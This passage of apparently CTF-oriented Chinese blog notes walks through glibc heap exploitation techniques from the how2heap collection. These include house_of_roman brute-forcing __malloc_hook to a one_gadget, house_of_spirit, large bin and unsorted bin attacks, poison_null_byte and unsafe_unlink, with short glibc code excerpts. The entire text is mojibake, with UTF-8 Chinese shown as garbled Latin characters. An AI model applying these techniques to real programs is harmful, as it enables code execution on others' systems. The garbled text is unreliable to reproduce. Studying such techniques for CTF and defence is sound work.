brkæ˜¯å°†æ•°æ®æ®µ(.data)çš„æœ€é«˜åœ°å€æŒ‡é’ˆ_edataå¾€é«˜åœ°å€æ¨ï¼ŒåŸå…ˆçš„topchunkè¢«æ”¾å…¥unsortedbinä¸­ï¼Œç„¶åå†ä»æ–°çš„topchunkå¤„å¼€å§‹åˆ†é…ã€‚(ä¸€èˆ¬ä¼šå¾€é«˜åœ°å€æ¨0x21000è¿™ä¹ˆå¤§ï¼ŒåŸºæœ¬å°±æ˜¯å†åŠ ä¸€ä¸ªåˆå§‹topchunkå¤§å°)\n\nâ‘¡mmapæ˜¯åœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼ˆå †å’Œæ ˆä¸­é—´ï¼Œç§°ä¸ºæ–‡ä»¶æ˜ å°„åŒºåŸŸçš„åœ°æ–¹ï¼‰æ‰¾ä¸€å—ç©ºé—²çš„è™šæ‹Ÿå†…å­˜ï¼Œè¿™æ ·åŸå…ˆçš„topchunkä¸ä¼šè¢«æ”¾åˆ°unsortedbinä¸­ï¼Œé‚£ä¹ˆå†åˆ†é…å°±æ˜¯ä»è¿™ä¸ªmmapä¸­åˆ†é…ï¼Œæ²¡åŠæ³•æ³„éœ²åœ°å€äº†ã€‚\n\n(3)å†ç”³è¯·ä¸€å—å†…å­˜ï¼Œå°±ä¼šä»unsortedbinä¸­çš„old_topchunkåˆ‡å‰²ï¼Œå¾—åˆ°çš„chunkçš„fdå’Œbkéƒ½å¸¦æœ‰ä¿¡æ¯ã€‚å¦‚æœç¨‹åºæ²¡æœ‰å°†ç”³è¯·çš„chunkå†…å­˜åˆå§‹åŒ–ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ³„éœ²åœ°å€ã€‚å¦å¤–ç”±äºåœ¨æ‰§è¡Œåˆ‡å‰²ä¹‹å‰ï¼Œold_topchunkä¼šè¢«å…ˆæ•´ç†åˆ°smallbinæˆ–è€…largebinä¸­(å…·ä½“çœ‹old_chunkçš„size)ï¼Œæ‰€ä»¥ç”³è¯·å›æ¥çš„chunkä¸­çš„fdå’Œbkçš„å†…å®¹åº”è¯¥æ˜¯å¯¹åº”smallbinæˆ–è€…largebiné“¾è¡¨å¤´çš„åœ°å€ï¼Œä¸æ˜¯unsortedbiné“¾è¡¨å¤´main_aren+88çš„åœ°å€ã€‚è¿™é‡Œéœ€è¦å…·ä½“è°ƒè¯•ä¸€ä¸‹å¥½è®¡ç®—åç§»ï¼Œæ–¹ä¾¿æ³„éœ²åœ°å€ã€‚\n\n \n\n9.house_of_romanï¼šæ— leakçš„åˆ©ç”¨ï¼Œçˆ†ç ´\n\n(1)ç”³è¯·3ä¸ªchunkï¼ŒchunkA,chunkB,chunkC,åˆ†åˆ«ä¸º0x20,0xd0,0x70.(Aç”¨æ¥è§¦å‘å•å­—èŠ‚æº¢å‡ºï¼Œä¿®æ”¹chunkBçš„sizeä½)\n\n(2)åœ¨chunkB+0x78å¤„è®¾ç½®p64(0x61)ï¼Œç”¨æ¥è¿‡æ£€æŸ¥ç”¨çš„ã€‚ï¼ˆ6+7=13(0xd)ï¼‰\n\n(3)é‡Šæ”¾chunkB , chunkBè¿›å…¥unsortedbin , è¿™æ ·chunkBçš„fdå’Œbkå¤„éƒ½æœ‰ main_arena çš„åœ°å€ã€‚\n\n(4)å†æ¬¡åˆ†é… 0xd0 ,ä¼šåˆ†é…åˆ°chunkBã€‚ä»¥ä¸Šæ­¥éª¤éƒ½æ˜¯ä¸ºäº†ä½¿å¾—chunkBä¸­å¸¦ä¸Šmain_arenaçš„åœ°å€ã€‚\n\n(5)å†ç”³è¯·ä¸‰ä¸ª0x70å¤§å°çš„chunkï¼ŒchunkD,chunkE,chunkFï¼ŒchunkFç”¨æ¥å ä½ç”¨ï¼Œé˜²æ­¢è¢«topchunkåå¹¶\n\n(6)é‡Šæ”¾æ‰chunkC,chunkD,ä½¿ä¹‹è¿›å…¥fastbinä¸­ï¼Œä¸ºchunkD->chunkCã€‚\n\n(7)åˆ©ç”¨UAFä¿®æ”¹chunkDçš„fdçš„ä½å­—èŠ‚ï¼Œä½¿å…¶æŒ‡å‘chunkBï¼Œå³å°†0xf0ä¿®æ”¹ä¸º0x20å³å¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n0xn000 chunkA\n0xn020 chunkB\n0xn0f0 chunkC\n0xn160 chunkD\n0xn1d0 chunkE\n0xn240 chunkF\n```\n\nè¿™é‡Œèƒ½å¤Ÿé€šè¿‡æ£€æŸ¥ï¼Œå› ä¸ºå‰é¢å°†chunkBçš„sizeè®¾ç½®æˆäº†0x70ï¼Œå¹¶ä¸”chunkB+0x78å¤„ä¹Ÿè¢«è®¾ç½®æˆäº†0x61ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡fastbinçš„æ£€æŸ¥ã€‚ä¼ªé€ äº†ä¸€ä¸ª0x70çš„chunkã€‚é‚£ä¹ˆ0x70å¤„çš„fastbinå°±å˜æˆchunkD->chunkB\n\n(8)ä¿®æ”¹chunkBçš„fdæŒ‡é’ˆæœ€åä¸¤ä¸ªå­—èŠ‚ä¸º\\xaa,\\xedä½¿å…¶æŒ‡å‘malloc_hook - 0x23å¤„ã€‚è¿™é‡Œå°±éœ€è¦ç”¨åˆ°çˆ†ç ´äº†ï¼Œ\\xaaä¸­çš„ç¬¬ä¸€ä¸ªaæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ‰16ç§å¯èƒ½æ€§ã€‚æ‰€ä»¥ç›´æ¥è®¾ç½®æˆaï¼ŒæˆåŠŸæ¦‚ç‡åº”è¯¥ä¸º1/16ã€‚\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/å›¾ç‰‡1.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/å›¾ç‰‡2.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/å›¾ç‰‡3.png)\n\nè€Œè¿™é‡Œéœ€è¦æŒ‡å‘malloc_hook - 0x23çš„åŸå› æ˜¯å› ä¸ºæ—¢è¦åŒ…å«__malloc_hookï¼Œåˆè¦ä½¿å¾—è¿™ä¸ªchunkçš„sizeä½ä¸º0x7fï¼Œè§‚å¯Ÿå†…å­˜å¯å¾—ï¼Œè¿™æ˜¯æœ€ä¼˜é€‰æ‹©ï¼Œé€‰å–çš„æ˜¯_IO_wide_data_0+304è¿™ä¸ªæ•°æ®ä¸­çš„7fï¼Œå…¶å®ƒçš„7féƒ½ä¼šå¸¦ä¸Šå…¶å®ƒçš„æ•°æ®ã€‚\n\n(9)ä¿®æ”¹å®ŒchunkBçš„fdï¼Œå°±åˆæˆåŠŸä¼ªé€ äº†ä¸€ä¸ª0x70å¤§å°çš„chunkï¼Œé‚£ä¹ˆ0x70çš„fastbinä¸­å°±å˜æˆï¼šchunkD->chunkB->malloc_hook - 0x23\n\n(10)ç°åœ¨è¿ç»­ç”³è¯·ä¸‰æ¬¡0x70å¤§å°çš„chunkï¼Œæœ€åä¸€ä¸ªchunkå°±å¾—åˆ°äº†malloc_hook - 0x23å¤„çš„chunkï¼Œé‚£ä¹ˆç°åœ¨å°±å¯ä»¥è®¡ç®—åç§»ä¿®æ”¹malloc+hookçš„å€¼ï¼Œä¿®æ”¹æœ€åä¸‰ä¸ªå­—èŠ‚ï¼ŒåŠ«æŒä¸ºone_gadgetã€‚æœ€å12ä½Bitså¯ä»¥é€šè¿‡å›ºå®šåç§»ç®—å‡ºæ¥ï¼Œä¸ä¼šæ”¹å˜ï¼Œä½†æ˜¯å‰é¢çš„12ä½bitsä¼šæ”¹å˜ï¼Œéœ€è¦çˆ†ç ´ã€‚è¿™é‡Œå¯ä»¥é€šè¿‡åˆšæ‰çš„\\xaaä¸­çš„aæ¥å‡å°‘çˆ†ç ´æ¬¡æ•°ï¼Œ\\xaaä¸­ç¬¬ä¸€ä¸ªaå·²ç»ç¡®å®šï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åç§»ç®—å‡ºæ¥éšæœºåŒ–ä¹‹åçš„one_gadgetä¸­çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ä¸­çš„ç¬¬ä¸€ä¸ª16ä½æ•°ï¼Œè¿™æ ·å°±åªéœ€è¦çˆ†ç ´å€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚å³å¯ã€‚é‚£ä¹ˆæ€»å…±éœ€è¦çš„æ•°å­¦æœŸæœ›å°±åº”è¯¥æ˜¯(0xff+1)*(0xf+1)=4096æ¬¡ã€‚\n\n(11)çˆ†ç ´æˆåŠŸåè¿˜éœ€è¦è§¦å‘__malloc_hookï¼Œé€šè¿‡è¿ç»­freeä¸¤æ¬¡åŒä¸€ä¸ªchunkï¼Œä½¿å¾—mallocæ£€æŸ¥åˆ°é”™è¯¯(ä¸»è¦ä¼šè°ƒç”¨ __libc_message æ¥æ‰§è¡Œabortå‡½æ•°)ã€‚å°±å¯ä»¥è§¦å‘malloc_printerrå‡½æ•°ï¼Œä»è€Œè°ƒç”¨__malloc_hookå‡½æ•°ï¼Œè¿›è€Œgetshellã€‚\n\n \n\n10.house_of_spirit:\n\n(1)é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹æ ˆä¸ŠæŸä¸ªchunkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ä¸€ä¸ªå¯æ§å†…å­˜çš„æ ˆåœ°å€ï¼Œå†ä¿®æ”¹è¯¥æ ˆåœ°å€å¯¹åº”chunkçš„sizeä½ã€‚\n\n(2)é€šè¿‡ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeç»•è¿‡æ£€æŸ¥ï¼Œç„¶åfreeæ‰è¯¥chunkæŒ‡é’ˆï¼Œå†ç”³è¯·å›æ¥ï¼Œå°±å¯ä»¥æ§åˆ¶ä¸­é—´åŒºåŸŸçš„å†…å®¹äº†ã€‚\n\nfakechunkA  uncontral_data  fakechunkB\n\nä¸­å¿ƒæ€æƒ³å°±æ˜¯å°†ä¸å¯æ§çš„å†…å­˜çº³å…¥ä¸€ä¸ªå¯æ§çš„Chunkä¸­ï¼Œä»è€Œå®ç°å¯æ§ã€‚\n\nâ–²\n\n```\n#æ³¨é‡Šå¤´\n\n//éœ€è¦ç»•è¿‡çš„ä»£ç (_int_freeå‡½æ•°)ä¸­ï¼š\nif (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)\n         || __builtin_expect (chunksize (chunk_at_offset (p, size))\n                 >= av->system_mem, 0))\n```\n\nå³fakechunkAçš„nextchunkï¼Œä¹Ÿå°±æ˜¯fakechunkA+fakechunkA->size = fakechunkBçš„sizeä½æ»¡è¶³å¤§äº2*SIZE_SZï¼ˆ64ä½ç¨‹åºä¸­SIZE_SZä¸º8ï¼‰ï¼Œå°äºav->system_memï¼ˆåœ¨main_arenaä¸­ï¼Œé»˜è®¤ä¸º128kbï¼‰ï¼Œä¸€èˆ¬ç®€å•è®¾ç½®åéƒ½èƒ½æ»¡è¶³ã€‚\n\n \n\n11.large_bin_attack_1ï¼šä»»æ„å¯å†™åœ°å€å†™å †åœ°å€\n\n(1)ç”³è¯·ä¸‰ä¸ªchunkï¼ŒchunkA,chunkB,chunkC,å¤§å°ä¾æ¬¡ä¸º0x80,0x400,0x400ï¼Œå…¶ä¸­è¿˜éœ€è¦æ’å…¥å…¶å®ƒçš„chunké˜²æ­¢åˆå¹¶ï¼Œç„¶åfreeæ‰chunkBï¼Œä½¿å…¶è¿›å…¥unsortedbinã€‚\n\nchunkAç”¨æ¥åˆ†å‰²ï¼ŒchunkBå’ŒchunkCç”¨æ¥æ”¾å…¥largebinä¸­\n\n(2)ç”³è¯·ä¸€ä¸ªå°äºchunkAçš„chunkï¼Œè§¦å‘unsortedbinæ•´ç†ï¼Œå°†chunkBæ•´ç†åˆ°largebinä¸­ã€‚ç„¶åchunkAè¢«åˆ†å‰²æˆchunkA_1,chunkA_2ï¼ŒchunkA_1è¿”å›ç»™ç”¨æˆ·ï¼ŒchunkA_2è¿›å…¥unsortedbinä¸­ã€‚\n\n(3)freeæ‰chunkCï¼Œä½¿å…¶è¿›å…¥unsortedbinä¸­ã€‚\n\n(4)åˆ©ç”¨æ¼æ´ä¿®æ”¹chunkBçš„sizeï¼Œä½¿å…¶å°äº0x410ã€‚\n\n(5)ä¿®æ”¹chunkBçš„bkä¸ºtarget_addr1-0x10ï¼Œbk_nextsizeä¸ºtarget_addr2_0x20ã€‚\n\n(6)åˆ†é…ä¸€ä¸ªæ¯”chunA_2å°çš„chunkï¼Œå†æ¬¡è§¦å‘æ•´ç†ï¼Œå°†chunkCæ•´ç†è‡³largebinä¸­ã€‚\n\n(7)ç”±äºchunkBçš„sizeå°äºchunkCçš„sizeï¼Œæ‰€ä»¥ä¼šå°†chunkCæ’å…¥largebinå¤§å°æ’åˆ—é“¾è¡¨çš„å¤´éƒ¨ï¼Œå³ä»¥ä¸‹ä»£ç ï¼š\n\nâ–²å¤§å°æ’åˆ—é“¾è¡¨çš„ä»£ç èµ‹å€¼è¿‡ç¨‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nvictim->bk_nextsize = fwd->bk_nextsize;\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\nè¿™é‡Œçš„victimå°±æ˜¯chunkCï¼Œfwdå°±æ˜¯chunkBï¼Œé‚£ä¹ˆfwd->bk_nextsizeå°±ç­‰äºtarget_addr2-0x20ã€‚\n\nâ‘ ç¬¬ä¸€è¡Œä»£ç å°±æ˜¯ï¼š\n\nchunkC->bk_nextsizeè¢«èµ‹å€¼ä¸ºtarget_addr2-0x20\n\nâ‘¡ç¬¬äºŒè¡Œä»£ç å°±æ˜¯ï¼š\n\n(target_addr2-0x20)->fd_nextsizeè¢«èµ‹å€¼ä¸ºchunkC_addrï¼Œç›¸å½“äº\n\n*((target_addr2-0x20)+0x20)=chunkC_addrï¼Œå³*(target_addr2)=chunC_addr\n\nâ–²é‡Šæ”¾é¡ºåºæ’åˆ—é“¾è¡¨çš„ä»£ç èµ‹å€¼è¿‡ç¨‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nbck = fwd->bk;\n// ......\nmark_bin (av, victim_index);\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\nä»¥ä¸Šå°±ç›¸å½“äºæ˜¯*(target_addr1)=chunC_addr\n\nâ˜…ç»¼ä¸Šæ‰€è¿°ï¼Œlargebin attackçš„ç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼å°±æ˜¯å°†ç›®çš„åœ°å€çš„å€¼ä¿®æ”¹æˆä¸€ä¸ªå †åœ°å€ã€‚\n\n \n\n12.large_bin_attack_2ï¼šå®ç°overlap chunk\n\n(1)ç”³è¯·å››ä¸ªchunkï¼ŒchunkA,chunkB,chunkC,chunkDä¹‹åæ„é€ ä¸€ä¸ªlargebinå¤§å°æ’åˆ—çš„é“¾è¡¨chunkA->chunkBï¼Œå…¶ä¸­chunkAä¸º0x420ï¼ŒchunkBä¸º0x400ï¼ŒchunkCä¸º0x400ï¼Œæœªé‡Šæ”¾ï¼ŒchunkDç”¨æ¥å ä½é˜²æ­¢åˆå¹¶ã€‚\n\n(2)åˆ©ç”¨æ¼æ´å°†chunkBçš„bk_nextsizeä¼ªé€ æŒ‡å‘chunkCï¼ŒåŒæ—¶å°†Cçš„fdä¸bkæ„é€ å¥½ï¼Œå°†Cçš„fd_nextsizeä¸bk_nextsizeèµ‹å€¼ä¸º0ã€‚\n\n(3)å½“å†æ¬¡ç”³è¯·0x410å¤§å°çš„å†…å­˜chunkEæ—¶ï¼Œéå†chunkB->bk_nextsizeä¼šæŒ‡å‘Cï¼Œä¸”Cçš„å¤§å°æ»¡è¶³éœ€æ±‚ï¼Œå› æ­¤ä¼šè°ƒç”¨unlinkå°†chunkCä»åŒé“¾è¡¨å–ä¸‹ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚\n\n(4)é‚£ä¹ˆç”³è¯·å‡ºæ¥çš„chunkEçš„åœ°å€ä¼šä¸ºchunkCçš„åœ°å€ï¼Œå³chunkEå’ŒchunkCä¸ºåŒä¸€å†…å­˜å—ï¼Œå®ç°overlap chunkçš„æ„é€ ã€‚\n\n \n\n13.mmap_overlapping_chunks:æš‚æ—¶ä¸å¥½æ‰¾\n\n \n\n14.overlapping_chunks:\n\n(1)freeä¹‹å‰ä¿®æ”¹sizeï¼Œåå¹¶é‚»å—è¿›å…¥bin\n\n(2)freeä¹‹åä¿®æ”¹sizeï¼Œåå¹¶é‚»å—ç”³è¯·å‡ºæ¥ã€‚\n\n \n\n15.poison_null_byteï¼šå®ç°overlap chunk\n\n(1)mallocä¸‰ä¸ªchunkï¼ŒchunkA,chunkB,chunkCã€‚\n\n(2)åˆ©ç”¨æ¼æ´ï¼Œé€šè¿‡chunkBä¿®æ”¹chunkCçš„pre_sizeä½å’Œpre_inuseä½ï¼Œä½¿å¾—chunkCçš„pre_sizeä½ä¸ºchunkA_size+chunkB_sizeã€‚\n\n(3)freeæ‰chunkCï¼Œæ­¤æ—¶chunkCçš„pre_inuseä½ä¸ºfreeçŠ¶æ€ï¼Œè§¦å‘å‘ä¸Šåˆå¹¶ï¼Œå°†chunkA,chunkB,chunkCä¸€èµ·freeæ‰ã€‚ä»è€Œå®ç°chunkBçš„overlapã€‚\n\nä½†æ˜¯ubuntu16.04æ‰“äº†è¡¥ä¸ï¼Œéœ€è¦ç»•è¿‡æ£€æŸ¥æ‰è¡Œã€‚\n\n \n\n16.unsafe_unlinkï¼šé€šå¸¸å­˜å‚¨chunkçš„ç»“æ„ä½“å…¨å±€æŒ‡é’ˆæ¥è¿›è¡Œunlinkæ”»å‡»ã€‚\n\n(1)æ‰¾åˆ°é¢˜ç›®ä¸­çš„chunklistä½ç½®ï¼Œå¹¶åˆ†æ¸…ç»“æ„ä½“ä¸­æ˜¯sizeåœ¨å‰è¿˜æ˜¯chunkåœ¨å‰ã€‚\n\n(2)è¿™é‡Œå‡è®¾æˆ‘ä»¬æƒ³è¦æ§åˆ¶chunklist[0]ä¸­çš„chunkã€‚ç”³è¯·chunk0,chunk1,chunk2ã€‚åœ¨chunk0ä¸­æ„é€ fakechunkï¼Œå¹¶è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)é€šè¿‡å †æº¢å‡ºæˆ–è€…off-by-oneå°†chunk1çš„pre_sizeè®¾ç½®æˆfakechunk_sizeï¼Œå°†chunk1çš„sizeè®¾ç½®æˆfakechunk_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk1ï¼Œè¿™æ ·å°±ä¼šè§¦å‘å‘ä¸Šåˆå¹¶ï¼Œå°†fakechunkå’Œchunk1åˆå¹¶ã€‚åŒæ—¶ï¼Œç”±äºåˆå¹¶è¿‡ç¨‹ä¸­è°ƒç”¨äº†unlinkå‡½æ•°ï¼Œé‚£ä¹ˆchunklist[0].chunkå°±ä¼šæŒ‡å‘chunlist_addr-0x18ï¼Œå¯¹åº”çš„å°±æ˜¯æˆ‘ä»¬çš„chunk0æŒ‡å‘chunklist_addr-0x18ã€‚\n\n(5)ç°åœ¨ä¿®æ”¹chunk0å°±ç›¸å½“äºä¿®æ”¹*(chunklist_addr-0x18)ï¼Œä»è€Œå°†chunk0æŒ‡å‘ä»»æ„åœ°å€ï¼Œåœ¨ä»»æ„åœ°å€å®ç°è¯»å†™ã€‚\n\n \n\n17.unsorted_bin_attackï¼šä»»æ„åœ°å€å†™&main_arena+0x58\n\n(1)åˆ©ç”¨æ¼æ´ï¼Œä¿®æ”¹å¤„åœ¨unsortedbinä¸­å°†è¦è¢«æ‹¿å‡ºæ¥çš„chunkçš„bkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘traget-0x10\n\n(2)ç”³è¯·è¿™ä¸ªå°†è¦è¢«æ‹¿å‡ºæ¥çš„chunkï¼Œä¼šæœ‰å¦‚ä¸‹ä»£ç è¢«è¿è¡Œï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nbck = victim->bk;\n..................................................\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n\nâ‘ ç¬¬ä¸€è¡Œä»£ç ä¸­victimå°±æ˜¯è¯¥chunkï¼Œé‚£ä¹ˆbckå°±ä¼šæŒ‡å‘traget_addr-0x10ã€‚\n\nâ‘¡ç¬¬å››è¡Œä»£ç å°±æ˜¯å°†bckçš„å€¼èµ‹å€¼ç»™unsortedbinçš„bkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘traget_addr-0x10ã€‚\n\nâ‘¢ç¬¬äº”è¡Œä»£ç å°±æ˜¯å°†unsortedbinçš„åœ°å€èµ‹å€¼ç»™bck->fdï¼Œä¹Ÿå°±æ˜¯*(target_addr-0x10+0x10)è¢«èµ‹å€¼ä¸ºunsortedbinçš„åœ°å€ï¼Œå³&main_arena+0x58ã€‚\n\nâ˜…ç»¼ä¸Šï¼Œunsortedbin attackå°±æ˜¯å°†ä»»æ„åœ°å€å¤„çš„å€¼ä¿®æ”¹æˆ&main_arena+0x58ã€‚\n\nâ–²ä¸€èˆ¬unsortedbin attackæ˜¯ç”¨æ¥é…åˆfastbin attackæ¥ä½¿ç”¨çš„ã€‚å› ä¸ºfastbin attackéœ€è¦ä¼ªé€ fakechunkçš„sizeï¼Œä½¿å…¶ç­‰äº0x71æˆ–0x7fç”¨æ¥ç»•è¿‡æ£€æŸ¥.é‚£ä¹ˆè¿™æ—¶å€™å°±å¯ä»¥ç”¨åˆ°unsortedbin attackä»»æ„åœ°å€å†™&main_arena+0x58è¿™ä¸ªæŠ€å·§äº†ï¼Œå¯ä»¥ä½¿å¾—fakechunkçš„sizeç­‰äº0x7fï¼Œä»è€Œç»•è¿‡æ£€æŸ¥ã€‚\n\n \n\n18.unsorted_bin_into_stackï¼š\n\n(1)åˆ©ç”¨æ¼æ´ï¼Œä¿®æ”¹unsortedbinä¸­ä½äºé“¾è¡¨å°¾éƒ¨çš„chunk_lastçš„bkæŒ‡é’ˆä½¿å…¶æŒ‡å‘æ ˆä¸Šä¼ªé€ çš„ä¸€ä¸ªfakechunkï¼Œä½¿å…¶sizeä¸ç­‰äºåŸå…ˆunsortedbinä¸­chunk_lastçš„sizeã€‚\n\n(2)ç”³è¯·fakechunkçš„sizeå¤§å°çš„chunkï¼Œä»unsortedbiné“¾è¡¨å°¾éƒ¨çš„chunkå¼€å§‹æŸ¥æ‰¾ï¼Œé¦–å…ˆchunk_lastçš„sizeä¸ç¬¦åˆï¼Œæ¥ç€æŸ¥æ‰¾chunk_last->bkï¼Œä¹Ÿå°±æ˜¯fakechunkï¼Œå‘ç°sizeç¬¦å·ï¼Œé‚£ä¹ˆå°±è¿”å›è¯¥fakechunkç»™ç”¨æˆ·ã€‚\n\nè¿™é‡Œçš„fakechunkå°±å¯ä»¥ä¼ªé€ åˆ°æ ˆä¸Šï¼Œä»è€Œæ§åˆ¶æ ˆä¸ŠåŸå…ˆä¸å¯æ§çš„å†…å®¹ã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nctfwiki\n\nhttps://github.com/shellphish/how2heap\n\nhttps://bbs.pediy.com/thread-259269.htm#msg_header_h2_12\n","tags":["how2heap"],"categories":["PWN","how2heap"]}]